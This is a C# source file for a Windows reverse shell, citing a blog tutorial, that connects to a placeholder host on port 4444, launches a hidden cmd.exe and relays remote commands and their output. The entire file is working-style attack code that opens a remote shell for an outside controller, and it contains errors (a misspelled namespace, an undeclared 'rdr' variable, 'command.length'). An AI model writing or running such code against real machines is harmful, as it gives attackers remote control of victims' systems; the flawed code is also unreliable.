using System;
using System.Text;
using System.IO;
using System.Diagnogstics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;

//https://www.puckiestyle.nl/c-simple-reverse-shell/

namespace reverse_shell {
    public class reverse__tcp_shell {
        static StreamWriter write;

        public static void Main(string[] args) {
            using(TcpClient client = new TcpClient("x.x.x.x", 4444)) {
                using(Stream stream = client.GetStream()) {
                    using(StreamReader read = new StreamReader(stream)) {
                        write = new StreamWriter(stream);
                        StringBuilder command = new StringBuilder();
                        Process proc = new Process();
                        proc.StartInfo.FileName = "cmd.exe";
                        proc.StartInfo.CreateNoWindow = true;
                        proc.StartInfo.UseShellExecute = false;
                        proc.StartInfo.RedirectStandardOutput = true;
                        proc.StartInfo.RedirectStandardInput = true;
                        proc.StartInfo.RedirectStandardError = true;
                        proc.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                        proc.Start();
                        proc.BeginOutputReadLine();

                        while (true) {
                            command.Append(rdr.ReadLine());
                            proc.StandardInput.WriteLine(command);
                            command.Remove(0, command.length);
                        }
                    }
                }
            }
        }
        public static void CmdOutputDataHandler(object proc_sent, DataReceivedEventArgs outLine ) {
            StringBuilder command_out = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data)) {
                try {
                    command_out.Append(outLine.Data);
                    write.WriteLine(command_out);
                    write.Flush();
                }
                catch (Exception err) { }
            }
        }
    }
}